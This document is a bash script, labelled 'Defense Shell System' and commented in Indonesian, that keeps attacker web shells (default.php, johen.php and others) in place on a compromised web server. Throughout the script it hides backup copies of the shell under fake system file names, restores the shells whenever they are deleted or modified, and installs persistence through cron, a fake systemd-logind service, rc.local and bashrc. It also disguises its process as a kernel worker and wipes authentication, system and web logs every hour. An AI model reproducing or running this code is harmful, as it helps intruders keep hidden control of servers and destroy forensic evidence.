#!/bin/bash

# ============================================
# JOHENLASTGEN
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Konfigurasi
BACKUP_DIR="/tmp/.systemd"
SHELL_FILE="wordfence-waf.php"
BACKUP_SHELL="/tmp/rev.bak"
LOG_FILE="/dev/shm/.system.log"
HIDE_PROCESS=true

# Warna output
print_status() {
    echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
}

# Buat direktori tersembunyi
setup_directories() {
    mkdir -p "$BACKUP_DIR" 2>/dev/null
    mkdir -p "/dev/shm/.cache" 2>/dev/null
    mkdir -p "/var/tmp/.systemd-private" 2>/dev/null
}

# Multi-location backup
create_backups() {
    local shell_source="$1"
    
    # Backup di berbagai lokasi
    cp "$shell_source" "/tmp/.dbus" 2>/dev/null
    cp "$shell_source" "/dev/shm/.X11-unix" 2>/dev/null
    cp "$shell_source" "/var/tmp/.systemd-private/systemd-resolved" 2>/dev/null
    cp "$shell_source" "$BACKUP_DIR/.systemd-logind" 2>/dev/null
    
    # Backup encoded
    base64 "$shell_source" > "/tmp/.log" 2>/dev/null
    base64 "$shell_source" > "/dev/shm/.cache/.update" 2>/dev/null
    
    print_success "Backups created in multiple locations"
}

# Restore from any available backup
restore_shell() {
    local target="$1"
    
    # Coba restore dari berbagai source
    if [ -f "/tmp/.dbus" ]; then
        cp "/tmp/.dbus" "$target"
    elif [ -f "/dev/shm/.X11-unix" ]; then
        cp "/dev/shm/.X11-unix" "$target"
    elif [ -f "/var/tmp/.systemd-private/systemd-resolved" ]; then
        cp "/var/tmp/.systemd-private/systemd-resolved" "$target"
    elif [ -f "$BACKUP_DIR/.systemd-logind" ]; then
        cp "$BACKUP_DIR/.systemd-logind" "$target"
    elif [ -f "/tmp/.log" ]; then
        base64 -d "/tmp/.log" > "$target"
    elif [ -f "/dev/shm/.cache/.update" ]; then
        base64 -d "/dev/shm/.cache/.update" > "$target"
    elif [ -f "$BACKUP_SHELL" ]; then
        cp "$BACKUP_SHELL" "$target"
    else
        return 1
    fi
    
    chmod 0444 "$target"
    return 0
}

# Monitor dan restore jika file hilang/berubah
monitor_file() {
    local file="$1"
    local checksum_file="/tmp/.checksum_$(echo "$file" | md5sum | cut -d' ' -f1)"
    
    # Buat checksum awal
    if [ -f "$file" ]; then
        md5sum "$file" | cut -d' ' -f1 > "$checksum_file"
    fi
    
    while true; do
        # Cek apakah file ada
        if [ ! -f "$file" ]; then
            print_status "File $file missing, restoring..."
            restore_shell "$file"
            echo "[$(date)] RESTORED_MISSING: $file" >> "$LOG_FILE"
        else
            # Cek checksum jika file ada
            local current_cs=$(md5sum "$file" 2>/dev/null | cut -d' ' -f1)
            local original_cs=$(cat "$checksum_file" 2>/dev/null)
            
            if [ "$current_cs" != "$original_cs" ] && [ -n "$original_cs" ]; then
                print_status "File $file modified, restoring..."
                restore_shell "$file"
                echo "[$(date)] RESTORED_MODIFIED: $file" >> "$LOG_FILE"
                # Update checksum
                md5sum "$file" | cut -d' ' -f1 > "$checksum_file"
            fi
        fi
        
        # Set permission setiap loop
        chmod 0444 "$file" 2>/dev/null
        
        sleep 3
    done
}

# Install ke crontab (multiple entries)
install_crontab() {
    local cmd="$1"
    
    # Cek apakah sudah ada
    if crontab -l 2>/dev/null | grep -q "$cmd"; then
        return
    fi
    
    # Backup crontab
    crontab -l 2>/dev/null > /tmp/.cron_bak
    
    # Tambahkan ke crontab dengan berbagai interval
    (
        crontab -l 2>/dev/null
        echo "@reboot $cmd"
        echo "*/5 * * * * $cmd"
        echo "*/15 * * * * $cmd"
        echo "@hourly $cmd"
    ) | crontab - 2>/dev/null
    
    print_success "Crontab persistence installed"
}

# Install ke berbagai startup scripts
install_startup() {
    local script_path="$1"
    
    # Systemd service (level 1)
    cat > /etc/systemd/system/systemd-logind.service << EOF
[Unit]
Description=System Login Service
After=network.target

[Service]
Type=simple
ExecStart=$script_path
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
    
    # rc.local
    if ! grep -q "$script_path" /etc/rc.local 2>/dev/null; then
        sed -i "s/exit 0/$script_path\nexit 0/" /etc/rc.local 2>/dev/null
        echo "$script_path &" >> /etc/rc.local 2>/dev/null
    fi
    
    # profile.d
    echo "$script_path &" > /etc/profile.d/system.sh 2>/dev/null
    
    # bashrc
    echo "$script_path &" >> ~/.bashrc 2>/dev/null
    echo "$script_path &" >> /root/.bashrc 2>/dev/null
    
    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-logind.service 2>/dev/null
    
    print_success "Startup persistence installed"
}

# Hide process from ps/top
hide_process() {
    if [ "$HIDE_PROCESS" = true ]; then
        # Rename process
        exec -a "[kworker/0:0]" "$0" "$@" &
        
        # Atau menggunakan LD_PRELOAD (jika tersedia)
        # export LD_PRELOAD="/usr/lib/libc.so"
    fi
}

# Self-replicate ke binary system
self_replicate() {
    local target_dir="/usr/lib/systemd"
    local target_bin="$target_dir/systemd-logind"
    
    mkdir -p "$target_dir"
    cp "$0" "$target_bin"
    chmod +x "$target_bin"
    
    print_success "Self-replication complete"
}

# Watchdog untuk monitor process
watchdog() {
    local pid_file="/tmp/.watchdog.pid"
    local script="$1"
    
    while true; do
        if ! pgrep -f "$script" | grep -v $$ > /dev/null; then
            print_status "Watchdog: Process died, restarting..."
            nohup "$script" > /dev/null 2>&1 &
        fi
        sleep 10
    done
}

# Main monitoring loop untuk semua file
monitor_all() {
    local files_to_monitor=(
        "default.php"
        "cgi-bin.php"
        "johen.php"
        "403.php"
    )
    
    for file in "${files_to_monitor[@]}"; do
        if [ -f "$file" ] || [ -f "$BACKUP_SHELL" ]; then
            monitor_file "$file" &
        fi
    done
}

# Clean logs secara berkala (anti forensic)
clean_logs() {
    while true; do
        # Clear command history
        history -c 2>/dev/null
        > ~/.bash_history 2>/dev/null
        > /root/.bash_history 2>/dev/null
        
        # Clear log files
        > /var/log/auth.log 2>/dev/null
        > /var/log/syslog 2>/dev/null
        > /var/log/apache2/access.log 2>/dev/null
        > /var/log/nginx/access.log 2>/dev/null
        
        # Clear lastlog
        echo > /var/log/lastlog 2>/dev/null
        
        sleep 3600  # Clean setiap jam
    done
}

# Main execution
main() {
    print_status "Starting Defense Shell System..."
    
    setup_directories
    
    # Pastikan backup shell ada
    if [ ! -f "$BACKUP_SHELL" ]; then
        print_error "Backup shell not found at $BACKUP_SHELL"
        exit 1
    fi
    
    create_backups "$BACKUP_SHELL"
    
    # Restore initial shell
    restore_shell "default.php"
    
    # Install persistensi
    install_crontab "$0"
    install_startup "$0"
    self_replicate
    
    # Start monitoring
    monitor_all &
    
    # Start watchdog
    watchdog "$0" &
    
    # Start log cleaner
    clean_logs &
    
    print_success "Defense Shell System Active"
    print_status "Monitoring: default.php and other shells"
    print_status "Backup locations: /tmp/.dbus, /dev/shm/.X11-unix, /var/tmp/.systemd-private"
    print_status "Log: $LOG_FILE"
    
    # Keep script running
    while true; do
        sleep 60
    done
}

# Check if already running
if pgrep -f "defend_shell.sh" | grep -v $$ > /dev/null; then
    print_error "Already running"
    exit 1
fi

hide_process
main
